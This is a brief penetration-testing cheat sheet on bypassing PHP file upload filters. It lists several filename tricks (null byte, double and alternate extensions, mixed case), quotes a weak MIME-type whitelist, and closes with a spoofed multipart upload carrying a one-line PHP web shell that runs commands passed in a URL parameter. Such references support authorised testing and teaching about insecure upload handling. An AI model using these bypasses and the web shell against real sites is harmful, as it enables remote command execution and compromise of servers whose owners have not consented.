---
title: WebApp PHP - File Upload Bypass
date: 2020-5-21
layout: single
classes: wide
tags:
  - PHP
  - WebApp
  - File
  - Upload
  - Bypass
--- 

## Overview
Techniques gathered to bypass PHP file upload filters.

### PHP Null Byte

```
photo.php%00.jpg
```
+ Only usable with older PHP versions ~<5.4

### Apache Dual Extentions

```
photo.php.png
```
+ Apache has a setting were a file can have 2 extensions
+ Apache will process the file as either type based on the extensions


### Alternate PHP Extentions

```
.phtml  .php3   .php4   .php5   .phps
```
+ There are many different file extensions for PHP.
+ Developers may blacklist `*.php` but forget `*.php3`

### Case Sensitive Bypass

+ Developers may blacklist `*.php` using case sensitive regex
+ This can be bypassed with `file.PhP`

### PHP File-Type Bypass

+ Typical of image uploads, developers will try to whitelist the allowed file types that may be uploaded.
```php
if ((($_FILES["file"]["type"] == "image/gif") || 
     ($_FILES["file"]["type"] == "image/jpeg")|| 
     ($_FILES["file"]["type"] == "image/JPG") ||
     ($_FILES["file"]["type"] == "image/png") || 
     ($_FILES["file"]["type"] == "image/pjpeg"))
```

+ This can be bypassed by changing the `Content-Type` in the POST request sent to the server

```bash
Content-Disposition: form-data; name="file"; filename="magic.php"
Content-Type: image/png

<?php echo shell_exec($_GET["magic"]); ?>
```   


## External References 
[PentesterLab.blog - Bypassing File Upload Restrictions](https://pentestlab.blog/2012/11/29/bypassing-file-upload-restrictions/)

